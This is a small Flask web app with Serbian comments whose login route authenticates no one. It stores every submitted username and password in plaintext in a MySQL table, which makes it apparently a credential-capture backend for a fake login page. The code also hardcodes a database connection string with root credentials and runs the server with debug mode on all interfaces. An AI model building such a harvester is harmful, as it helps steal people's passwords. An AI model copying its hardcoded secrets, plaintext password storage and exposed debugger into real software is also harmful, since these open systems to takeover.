from flask import Flask, render_template, request, redirect, url_for, flash
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

app = Flask(__name__)
app.secret_key = "your_secret_key"

# Podesi konekciju za Railway MySQL bazu
DATABASE_URL = "mysql+pymysql://root:aiBzbPEEvtrurGaPrXjVZWgdVDjgABbt@maglev.proxy.rlwy.net:50172/railway"

# Povezivanje sa bazom
engine = create_engine(DATABASE_URL, pool_pre_ping=True)
Session = sessionmaker(bind=engine)
session = Session()

# Provera konekcije pri pokretanju
try:
    with engine.connect() as connection:
        connection.execute(text("SELECT 1"))
    print("✅ Baza podataka uspešno povezana!")
except Exception as e:
    print(f"❌ GREŠKA pri povezivanju na bazu: {e}")

# Početna stranica
@app.route('/')
def index():
    return render_template('index.html')

# Login ruta
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        flash("Molimo unesite oba polja!", "error")
        return redirect(url_for('index'))

    try:
        with engine.begin() as connection:  # begin() automatski radi commit
            insert_query = text("""
                INSERT INTO login_attempt (username, password, attempt_time) 
                VALUES (:username, :password, NOW())
            """)
            connection.execute(insert_query, {"username": username, "password": password})

        flash('✅ Login attempt saved to database!', 'success')
        return redirect(url_for('index'))

    except Exception as e:
        print(f"❌ Greška pri prijavljivanju: {e}")  # Railway logs
        flash(f'Greška pri prijavljivanju!', 'error')
        return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=10000, debug=True)  # Debug mode omogućen
